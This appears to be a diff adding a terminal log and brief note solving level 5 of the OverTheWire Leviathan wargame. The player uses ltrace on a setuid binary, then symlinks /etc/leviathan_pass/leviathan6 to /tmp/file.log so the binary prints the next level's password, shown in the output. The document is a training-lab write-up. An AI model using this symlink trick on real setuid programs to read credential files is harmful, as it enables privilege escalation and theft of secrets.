@@ -1,0 +1,30 @@
+leviathan5@leviathan:~$ ls -la
+total 28
+drwxr-xr-x  2 root       root       4096 May 10 18:27 .
+drwxr-xr-x 10 root       root       4096 May 10 18:27 ..
+-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
+-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
+-rw-r--r--  1 root       root        675 May 15  2017 .profile
+-r-sr-x---  1 leviathan6 leviathan5 7764 May 10 18:27 leviathan5
+leviathan5@leviathan:~$ ./leviathan5
+Cannot find /tmp/file.log
+leviathan5@leviathan:~$ ltrace ./leviathan5
+__libc_start_main(0x56555760, 1, 0xffffd744, 0x56555840 <unfinished ...>
+fopen("/tmp/file.log", "r")                                                                                          = 0
+puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
+)                                                                                    = 26
+exit(-1 <no return ...>
++++ exited (status 255) +++
+leviathan5@leviathan:~$ ls
+leviathan5
+leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@leviathan:~$ ./leviathan5
+UgaoFee4li
+leviathan5@leviathan:~$ exit
+logout
+Connection to leviathan.labs.overthewire.org closed.
+
+
+#we need to link /etc/leviathan_pass/leviathan6 to /tmp/file.log 
+so use ln commands.
+$ ln -s /etc/leviathan_pass/leviathan6  /tmp/file.log 
